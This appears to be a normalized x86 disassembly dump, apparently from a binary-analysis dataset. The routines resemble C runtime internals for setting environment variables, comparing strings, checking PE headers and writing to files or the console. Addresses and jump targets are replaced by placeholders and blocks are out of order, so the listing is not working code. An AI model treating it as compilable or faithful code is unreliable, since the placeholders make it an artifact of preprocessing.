sub edi ebx
sar edi 0x1
push ebx
mov [ ebp - 0x14 ] edi
call sub_41c807
mov ebx eax
cmp ebx esi
pop ecx
jl r-xdata
cmp [ ebp - 0x8 ] esi
jne r-xdata
cmp eax esi
je r-xdata
cmp [ ebp - 0x8 ] esi
jne r-xdata
mov edi [ ebp - 0x18 ]
cmp [ edi ] esi
je r-xdata
xor eax eax
jmp r-xdata
cmp eax esi
jne r-xdata
call sub_417a79
mov [ rw-data ] eax
call sub_41779c
test eax eax
jge r-xdata
push [ ebp - 0xc ]
call sub_4121b5
mov eax [ ebp + 0x8 ]
pop ecx
mov [ eax ] esi
cmp ebx esi
jge r-xdata
lea edi [ edi + ebx * 4 ]
push [ edi ]
call sub_4121b5
pop ecx
cmp [ ebp - 0x8 ] esi
jne r-xdata
pop edi
pop ebx
push 0x4
call sub_418672
pop ecx
mov [ rw-data ] eax
cmp eax esi
je r-xdata
push 0x4
call sub_418672
pop ecx
mov [ rw-data ] eax
cmp eax esi
je r-xdata
call sub_42317a
test eax eax
je r-xdata
lea eax [ ebx + 0x2 ]
cmp eax ebx
jl r-xdata
neg ebx
cmp [ edi ] esi
jne r-xdata
mov eax [ ebp - 0xc ]
mov [ edi ] eax
mov eax [ ebp + 0x8 ]
mov [ eax ] esi
jmp r-xdata
mov [ eax ] esi
mov [ eax ] esi
cmp [ rw-data ] esi
jne r-xdata
cmp eax 0x3fffffff
jae r-xdata
mov eax [ edi + 0x4 ]
mov [ edi ] eax
mov eax [ ebp - 0x18 ]
inc ebx
lea edi [ eax + ebx * 4 ]
cmp ebx 0x3fffffff
jae r-xdata
cmp [ ebp + 0xc ] esi
je r-xdata
push eax
push 0x4
push [ rw-data ]
call sub_418751
add esp 0xc
cmp eax esi
je r-xdata
push 0x4
push ebx
push [ rw-data ]
call sub_418751
add esp 0xc
cmp eax esi
je r-xdata
cmp [ ebp - 0x8 ] esi
je r-xdata
push 0x2
push [ ebp - 0xc ]
call sub_411794
inc eax
pop ecx
inc eax
push eax
call sub_4186b7
mov edi eax
pop ecx
pop ecx
mov [ ebp - 0x1c ] edi
cmp edi esi
je r-xdata
mov ecx [ ebp - 0xc ]
lea ebx [ eax + ebx * 4 ]
mov [ ebx ] ecx
mov ecx [ ebp + 0x8 ]
mov [ ebx + 0x4 ] esi
mov [ ecx ] esi
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
push [ ebp - 0xc ]
call sub_4121b5
mov eax [ ebp + 0x8 ]
pop ecx
mov [ eax ] esi
push [ ebp - 0xc ]
push [ ebp - 0xc ]
call sub_411794
inc eax
pop ecx
inc eax
push eax
push edi
call sub_420230
add esp 0xc
test eax eax
je r-xdata
mov [ rw-data ] eax
mov eax [ ebp - 0x14 ]
lea ebx [ edi + eax * 2 ]
xor eax eax
mov [ ebx ] ax
inc ebx
inc ebx
cmp [ rw-data ] 0x1
jne r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_418855
add esp 0x14
cmp [ rw-data ] esi
jne r-xdata
mov eax [ ebp - 0x8 ]
neg eax
sbb eax eax
not eax
and eax ebx
push eax
push edi
call [ SetEnvironmentVariableW@IAT ]
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
push esi
push esi
push esi
push esi
push 0xffffffff
push edi
mov edi [ WideCharToMultiByte@IAT ]
push esi
push esi
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] esi
call edi
mov [ ebp - 0x10 ] eax
cmp eax esi
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
push edi
call sub_4121b5
pop ecx
call sub_4119bb
mov [ eax ] 0x2a
or [ ebp - 0x4 ] 0xffffffff
push 0x1
push eax
call sub_4186b7
pop ecx
pop ecx
mov [ ebp - 0x18 ] eax
cmp eax esi
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov [ rw-data ] esi
jmp r-xdata
push esi
push esi
push [ ebp - 0x10 ]
push eax
push 0xffffffff
push [ ebp - 0x1c ]
push esi
push esi
call edi
test eax eax
je r-xdata
cmp [ ebp - 0x8 ] esi
jne r-xdata
cmp [ ebp - 0x4 ] 0xffffffff
je r-xdata
push esi
push esi
push esi
push esi
push 0xffffffff
push ebx
push esi
push esi
call edi
mov [ ebp - 0x10 ] eax
cmp eax esi
je r-xdata
push [ ebp - 0x14 ]
call sub_4121b5
push [ ebp - 0x18 ]
call sub_4121b5
mov edi [ ebp - 0x1c ]
pop ecx
pop ecx
mov eax [ ebp - 0x8 ]
neg eax
sbb eax eax
not eax
and eax [ ebp - 0x14 ]
push eax
push [ ebp - 0x18 ]
call [ SetEnvironmentVariableA@IAT ]
test eax eax
jne r-xdata
push 0x1
push eax
call sub_4186b7
pop ecx
pop ecx
mov [ ebp - 0x14 ] eax
cmp eax esi
je r-xdata
push esi
push esi
push [ ebp - 0x10 ]
push eax
push 0xffffffff
push ebx
push esi
push esi
call edi
test eax eax
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
sub_41cc1a
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ rw-data ]
jmp r-xdata
mov eax [ esi ]
test eax eax
jne r-xdata
push edi
push eax
push [ ebp + 0x8 ]
call sub_41d157
add esp 0xc
test eax eax
jne r-xdata
mov eax esi
sub eax [ rw-data ]
sar eax 0x2
neg eax
add esi 0x4
mov eax [ esi ]
mov al [ edi + eax ]
cmp al 0x3d
je r-xdata
mov eax esi
sub eax [ rw-data ]
sar eax 0x2
jmp r-xdata
test al al
je r-xdata
pop esi
pop ebp
retn
sub_41cc6c
mov edi edi
push ebp
mov ebp esp
push ecx
push edi
mov edi eax
xor eax eax
mov ecx edi
test edi edi
je r-xdata
pop edi
leave
retn
cmp [ edi ] eax
je r-xdata
push esi
inc eax
push 0x4
push eax
call sub_4186b7
mov esi eax
pop ecx
pop ecx
mov [ ebp - 0x4 ] esi
test esi esi
jne r-xdata
add ecx 0x4
inc eax
cmp [ ecx ] 0x0
jne r-xdata
mov eax [ edi ]
test eax eax
jne r-xdata
push 0x9
call sub_416f1d
jmp r-xdata
push eax
call sub_423201
mov [ esi ] eax
add esi 0x4
add edi 0x4
and [ esi ] eax
mov eax [ ebp - 0x4 ]
pop esi
pop ecx
sub_41ccc6
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
mov [ ebp - 0xc ] ebx
cmp eax ebx
jne r-xdata
push esi
mov esi [ eax ]
push edi
mov [ ebp - 0x4 ] esi
cmp esi ebx
je r-xdata
call sub_4119bb
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_41897d
add esp 0x14
or eax 0xffffffff
jmp r-xdata
call sub_4119bb
mov [ eax ] 0x16
push 0x3d
push esi
call sub_41d052
mov edi eax
pop ecx
pop ecx
mov [ ebp - 0x14 ] edi
cmp edi ebx
je r-xdata
pop ebx
leave
retn
cmp esi edi
je r-xdata
xor eax eax
cmp [ edi + 0x1 ] bl
sete al
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
cmp eax [ rw-data ]
jne r-xdata
cmp eax ebx
jne r-xdata
call sub_41cc6c
mov [ rw-data ] eax
mov esi [ rw-data ]
mov [ ebp - 0x10 ] esi
cmp esi ebx
je r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
or eax 0xffffffff
sub edi [ ebp - 0x4 ]
push [ ebp - 0x4 ]
call sub_41cc1a
mov edi eax
cmp edi ebx
pop ecx
jl r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
cmp [ rw-data ] ebx
je r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
cmp [ esi ] ebx
je r-xdata
xor eax eax
jmp r-xdata
push 0x4
call sub_418672
pop ecx
mov [ rw-data ] eax
cmp eax ebx
je r-xdata
call sub_41d171
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call sub_4121b5
mov eax [ ebp + 0x8 ]
pop ecx
mov [ eax ] ebx
cmp edi ebx
jge r-xdata
lea esi [ esi + edi * 4 ]
push [ esi ]
call sub_4121b5
pop ecx
cmp [ ebp - 0x8 ] ebx
jne r-xdata
pop edi
pop esi
mov [ eax ] ebx
cmp [ rw-data ] ebx
jne r-xdata
lea eax [ edi + 0x2 ]
cmp eax edi
jl r-xdata
neg edi
cmp [ esi ] ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
jmp r-xdata
push 0x4
call sub_418672
pop ecx
mov [ rw-data ] eax
cmp eax ebx
je r-xdata
cmp eax 0x3fffffff
jae r-xdata
mov eax [ esi + 0x4 ]
mov [ esi ] eax
mov eax [ ebp - 0x10 ]
inc edi
lea esi [ eax + edi * 4 ]
cmp edi 0x3fffffff
jae r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
mov [ eax ] ebx
push eax
push 0x4
push [ rw-data ]
call sub_418751
add esp 0xc
cmp eax ebx
je r-xdata
push 0x4
push edi
push [ rw-data ]
call sub_418751
add esp 0xc
cmp eax ebx
je r-xdata
cmp [ ebp - 0x8 ] ebx
je r-xdata
mov esi [ ebp - 0x4 ]
push 0x1
push esi
call sub_412e40
inc eax
pop ecx
inc eax
push eax
call sub_4186b7
mov edi eax
pop ecx
pop ecx
cmp edi ebx
je r-xdata
mov edx [ ebp - 0x4 ]
lea ecx [ eax + edi * 4 ]
mov [ ecx ] edx
mov [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
mov [ ecx ] ebx
jmp r-xdata
mov eax [ ebp - 0xc ]
jmp r-xdata
push [ ebp - 0x4 ]
call sub_4121b5
mov eax [ ebp + 0x8 ]
pop ecx
mov [ eax ] ebx
push esi
push esi
call sub_412e40
inc eax
pop ecx
inc eax
push eax
push edi
call sub_41cf11
add esp 0xc
test eax eax
je r-xdata
mov [ rw-data ] eax
mov ecx [ ebp - 0x8 ]
mov eax edi
sub eax esi
add eax [ ebp - 0x14 ]
mov [ eax ] bl
inc eax
neg ecx
sbb ecx ecx
not ecx
and ecx eax
push ecx
push edi
call [ SetEnvironmentVariableA@IAT ]
test eax eax
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_418855
add esp 0x14
push edi
call sub_4121b5
pop ecx
or [ ebp - 0xc ] 0xffffffff
call sub_4119bb
mov [ eax ] 0x2a
sub_41cf11
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp ecx ebx
je r-xdata
call sub_4119bb
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov edx ecx
mov [ ecx ] bl
jmp r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ ecx ] bl
call sub_4119bb
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
inc esi
cmp al bl
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_41897d
add esp 0x14
mov eax esi
jmp r-xdata
sub_41cf79
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0xc ] eax
jbe r-xdata
pop ebp
retn
mov ecx [ ebp + 0x8 ]
inc eax
inc ecx
cmp eax [ ebp + 0xc ]
jb r-xdata
cmp [ ecx ] 0x0
je r-xdata
sub_41cf96
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
call sub_415547
mov eax [ ebp + 0x8 ]
xor ebx ebx
cmp eax ebx
jne r-xdata
push esi
mov esi [ ebp - 0xc ]
cmp [ esi + 0x8 ] ebx
jne r-xdata
call sub_4119bb
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_41897d
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
movzx cx [ eax ]
movzx ecx cx
cmp cx bx
jne r-xdata
push [ ebp + 0xc ]
push eax
call sub_4158c0
pop ecx
pop ecx
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
movzx edx cl
test [ edx + esi + 0x1d ] 0x4
je r-xdata
movzx ecx cx
cmp [ ebp + 0xc ] ecx
jne r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
pop ebx
leave
retn
movzx edx cx
cmp [ ebp + 0xc ] edx
je r-xdata
inc eax
mov dl [ eax ]
cmp dl bl
je r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
pop esi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
inc eax
movzx ecx cx
movzx edx dl
shl ecx 0x8
or ecx edx
cmp [ ebp + 0xc ] ecx
jne r-xdata
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
dec eax
jmp r-xdata
sub_41d069
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_415547
mov ecx [ ebp + 0x10 ]
xor ebx ebx
cmp ecx ebx
jne r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
call sub_4119bb
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_41897d
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push esi
mov esi 0x7fffffff
cmp ecx esi
jbe r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] ebx
jne r-xdata
call sub_4119bb
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_41897d
add esp 0x14
jmp r-xdata
push [ eax + 0x4 ]
push ecx
push [ ebp + 0xc ]
push ecx
push [ ebp + 0x8 ]
push 0x1001
push [ eax + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
call sub_4235e4
add esp 0x20
cmp eax ebx
jne r-xdata
push [ ebp + 0x14 ]
push ecx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_423626
add esp 0x10
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
add eax 0xfffffffe
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop esi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_41d171
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
xor esi esi
push edi
mov edi [ rw-data ]
mov [ ebp - 0x4 ] esi
mov eax [ edi ]
cmp eax esi
je r-xdata
xor eax eax
mov ebx [ WideCharToMultiByte@IAT ]
or eax 0xffffffff
jmp r-xdata
push 0x1
push eax
call sub_4186b7
pop ecx
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax esi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
push esi
push esi
push [ ebp - 0x8 ]
push eax
push 0xffffffff
push [ edi ]
push esi
push esi
call ebx
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call sub_4121b5
pop ecx
jmp r-xdata
lea eax [ ebp - 0x4 ]
push esi
push eax
call sub_41ccc6
pop ecx
pop ecx
test eax eax
jge r-xdata
add edi 0x4
mov eax [ edi ]
cmp eax esi
jne r-xdata
cmp [ ebp - 0x4 ] esi
je r-xdata
push esi
push esi
push esi
push esi
push 0xffffffff
push eax
push esi
push esi
call ebx
mov [ ebp - 0x8 ] eax
cmp eax esi
je r-xdata
push [ ebp - 0x4 ]
call sub_4121b5
pop ecx
mov [ ebp - 0x4 ] esi
sub_41d208
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push esi
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_420eff
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
mov eax esi
pop esi
leave
retn
cmp [ ebp - 0x4 ] eax
je r-xdata
call sub_4119bb
test eax eax
je r-xdata
call sub_4119bb
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
sub_41d248
test [ ecx + 0xc ] 0x40
je r-xdata
dec [ ecx + 0x4 ]
js r-xdata
cmp [ ecx + 0x8 ] 0x0
je r-xdata
movsx eax al
push ecx
push eax
call sub_419079
pop ecx
pop ecx
mov edx [ ecx ]
mov [ edx ] al
inc [ ecx ]
movzx eax al
jmp r-xdata
inc [ esi ]
retn
or [ esi ] eax
retn
cmp eax 0xffffffff
jne r-xdata
sub_41d27b
mov edi edi
push ebp
mov ebp esp
push esi
mov esi eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
mov ecx [ ebp + 0x10 ]
mov al [ ebp + 0x8 ]
dec [ ebp + 0xc ]
call sub_41d248
cmp [ esi ] 0xffffffff
je r-xdata
pop esi
pop ebp
retn
sub_41d2a1
mov edi edi
push ebp
mov ebp esp
test [ edi + 0xc ] 0x40
push ebx
push esi
mov esi eax
mov ebx ecx
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jg r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov al [ ebx ]
dec [ ebp + 0x8 ]
mov ecx edi
call sub_41d248
inc ebx
cmp [ esi ] 0xffffffff
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
add [ esi ] eax
jmp r-xdata
call sub_4119bb
cmp [ eax ] 0x2a
jne r-xdata
mov ecx edi
mov al 0x3f
call sub_41d248
sub_41d2ee
mov edi edi
push ebp
mov ebp esp
sub esp 0x278
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push edi
mov edi [ ebp + 0x14 ]
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x25c ]
mov [ ebp - 0x24c ] esi
mov [ ebp - 0x224 ] edi
mov [ ebp - 0x248 ] eax
mov [ ebp - 0x210 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x230 ] eax
mov [ ebp - 0x240 ] eax
mov [ ebp - 0x238 ] eax
call sub_415547
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_4119bb
mov [ eax ] 0x16
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_41897d
add esp 0x14
cmp [ ebp - 0x250 ] 0x0
je r-xdata
xor ecx ecx
cmp ebx ecx
je r-xdata
push esi
call sub_41b3c1
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x254 ]
and [ eax + 0x70 ] 0xfffffffd
mov dl [ ebx ]
mov [ ebp - 0x228 ] ecx
mov [ ebp - 0x220 ] ecx
mov [ ebp - 0x244 ] ecx
mov [ ebp - 0x211 ] dl
test dl dl
je r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_411f81
leave
retn
cmp [ ebp - 0x250 ] 0x0
je r-xdata
inc ebx
cmp [ ebp - 0x228 ] 0x0
mov [ ebp - 0x23c ] ebx
jl r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov esi eax
sar esi 0x5
shl ecx 0x6
add ecx [ esi * 4 + rw-data ]
jmp r-xdata
mov eax [ ebp - 0x228 ]
mov eax [ ebp - 0x254 ]
and [ eax + 0x70 ] 0xfffffffd
mov al dl
sub al 0x20
cmp al 0x58
ja r-xdata
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
xor esi esi
xor eax eax
movsx eax dl
movsx eax [ eax + r--data ]
and eax 0xf
xor esi esi
jmp r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
mov ebx [ ebp - 0x23c ]
mov al [ ebx ]
mov [ ebp - 0x211 ] al
test al al
je r-xdata
jmp [ eax * 4 + r-xdata ]
movsx eax [ ecx + eax * 8 + r--data ]
push 0x7
sar eax 0x4
pop ecx
mov [ ebp - 0x26c ] eax
cmp eax ecx
ja r-xdata
test [ eax + 0x24 ] 0x80
jne r-xdata
mov ecx [ ebp - 0x26c ]
mov edi [ ebp - 0x224 ]
mov dl al
jmp r-xdata
sub_41de86
push 0x10
push r--data
call sub_4183f0
xor ebx ebx
mov [ ebp - 0x1c ] ebx
push 0x1
call sub_419f99
pop ecx
mov [ ebp - 0x4 ] ebx
push 0x3
pop edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41df1c
mov eax [ ebp - 0x1c ]
call sub_418435
retn
mov esi edi
shl esi 0x2
mov eax [ rw-data ]
add eax esi
cmp [ eax ] ebx
je r-xdata
inc edi
jmp r-xdata
mov eax [ eax ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] edi
cmp edi [ rw-data ]
jge r-xdata
cmp edi 0x14
jl r-xdata
push eax
call sub_412a1c
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov eax [ esi + eax ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
mov eax [ rw-data ]
push [ esi + eax ]
call sub_4121b5
pop ecx
mov eax [ rw-data ]
mov [ esi + eax ] ebx
inc [ ebp - 0x1c ]
sub_41df30
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax 0x5a4d
cmp [ ecx ] ax
je r-xdata
mov eax [ ecx + 0x3c ]
add eax ecx
cmp [ eax ] 0x4550
jne r-xdata
xor eax eax
pop ebp
retn
xor edx edx
mov ecx 0x10b
cmp [ eax + 0x18 ] cx
sete dl
mov eax edx
pop ebp
retn
sub_41df70
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
add ecx eax
movzx eax [ ecx + 0x14 ]
push ebx
push esi
movzx esi [ ecx + 0x6 ]
xor edx edx
push edi
lea eax [ eax + ecx + 0x18 ]
test esi esi
jbe r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
inc edx
add eax 0x28
cmp edx esi
jb r-xdata
mov ebx [ eax + 0x8 ]
add ebx ecx
cmp edi ebx
jb r-xdata
mov ecx [ eax + 0xc ]
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41dfd0
mov edi edi
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_418450
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push __dos_header
call sub_41df30
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
sub eax __dos_header
push eax
push __dos_header
call sub_41df70
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41e08d
mov edi edi
push ebp
mov ebp esp
mov eax 0x1ae4
call sub_4137d0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push esi
xor esi esi
mov [ ebp - 0x1acc ] eax
mov [ ebp - 0x1ac8 ] esi
mov [ ebp - 0x1ad0 ] esi
cmp [ ebp + 0x10 ] esi
jne r-xdata
cmp eax esi
jne r-xdata
xor eax eax
jmp r-xdata
push ebx
push edi
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
lea esi [ eax * 4 + rw-data ]
mov eax [ esi ]
and edi 0x1f
shl edi 0x6
add eax edi
mov bl [ eax + 0x24 ]
add bl bl
sar bl 0x1
mov [ ebp - 0x1ad8 ] esi
mov [ ebp - 0x1ad9 ] bl
cmp bl 0x2
je r-xdata
call sub_4119ce
mov [ eax ] esi
call sub_4119bb
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_41897d
add esp 0x14
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_411f81
leave
retn
mov ecx [ ebp + 0x10 ]
not ecx
test cl 0x1
jne r-xdata
cmp bl 0x1
jne r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
call sub_4119ce
xor esi esi
mov [ eax ] esi
call sub_4119bb
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_41897d
add esp 0x14
jmp r-xdata
push [ ebp + 0x8 ]
call sub_421df6
pop ecx
test eax eax
je r-xdata
push 0x2
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_42034c
add esp 0x10
or eax 0xffffffff
jmp r-xdata
xor ecx ecx
mov eax [ esi ]
test [ edi + eax + 0x4 ] 0x80
je r-xdata
pop edi
pop ebx
push 0x0
lea ecx [ ebp - 0x1ad4 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp - 0x1acc ]
push [ eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac0 ] ecx
test bl bl
jne r-xdata
call sub_41807a
mov eax [ eax + 0x6c ]
xor ecx ecx
cmp [ eax + 0x14 ] ecx
lea eax [ ebp - 0x1ae4 ]
sete cl
push eax
mov eax [ esi ]
push [ edi + eax ]
mov [ ebp - 0x1ae0 ] ecx
call [ GetConsoleMode@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1ac0 ] eax
mov eax [ ebp - 0x1ad4 ]
and [ ebp - 0x1ac0 ] 0x0
mov [ ebp - 0x1ac8 ] eax
jmp r-xdata
mov [ ebp - 0x1abc ] eax
cmp bl 0x2
jne r-xdata
mov [ ebp - 0x1ac4 ] eax
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
xor ecx ecx
cmp [ ebp - 0x1ae0 ] ecx
je r-xdata
mov eax [ ebp - 0x1ac8 ]
sub eax [ ebp - 0x1ad0 ]
cmp [ ebp - 0x1ac0 ] 0x0
je r-xdata
cmp [ ebp - 0x1ac8 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov eax [ esi ]
test [ edi + eax + 0x4 ] 0x40
je r-xdata
jmp r-xdata
call [ GetConsoleCP@IAT ]
mov ebx [ ebp - 0x1acc ]
mov [ ebp - 0x1ae4 ] eax
xor eax eax
mov [ ebp - 0x1ac4 ] eax
cmp [ ebp + 0x10 ] eax
jbe r-xdata
test bl bl
je r-xdata
mov esi [ ebp - 0x1ad8 ]
push 0x5
pop esi
cmp [ ebp - 0x1ac0 ] esi
jne r-xdata
mov ecx [ ebp - 0x1abc ]
and [ ebp - 0x1ac4 ] 0x0
sub ecx [ ebp - 0x1acc ]
push 0x2
lea eax [ ebp - 0x6b8 ]
pop esi
jmp r-xdata
call sub_4119bb
mov [ eax ] 0x1c
call sub_4119ce
and [ eax ] 0x0
mov eax [ ebp - 0x1acc ]
cmp [ eax ] 0x1a
jne r-xdata
mov ecx [ ebp - 0x1ac4 ]
and [ ebp - 0x1abc ] 0x0
sub ecx [ ebp - 0x1acc ]
lea eax [ ebp - 0x1ab8 ]
mov [ ebp - 0x1abc ] eax
mov eax [ esi ]
add eax edi
test [ eax + 0x4 ] 0x80
je r-xdata
push [ ebp - 0x1ac0 ]
call sub_4119e1
pop ecx
jmp r-xdata
call sub_4119bb
mov [ eax ] 0x9
call sub_4119ce
mov [ eax ] esi
jmp r-xdata
xor esi esi
push esi
push esi
push 0xd55
lea ecx [ ebp - 0x1410 ]
push ecx
lea ecx [ ebp - 0x6b8 ]
sub eax ecx
cdq
sub eax edx
sar eax 0x1
push eax
mov eax ecx
push eax
push esi
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov ebx eax
cmp ebx esi
je r-xdata
mov edx [ ebp - 0x1abc ]
movzx edx [ edx ]
add [ ebp - 0x1abc ] esi
add ecx esi
cmp dx 0xa
jne r-xdata
mov ecx [ ebp - 0x1abc ]
and [ ebp - 0x1ac4 ] 0x0
sub ecx [ ebp - 0x1acc ]
lea eax [ ebp - 0x1ab8 ]
xor eax eax
jmp r-xdata
mov ebx eax
lea eax [ ebp - 0x1ab8 ]
sub ebx eax
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push ebx
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ esi ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
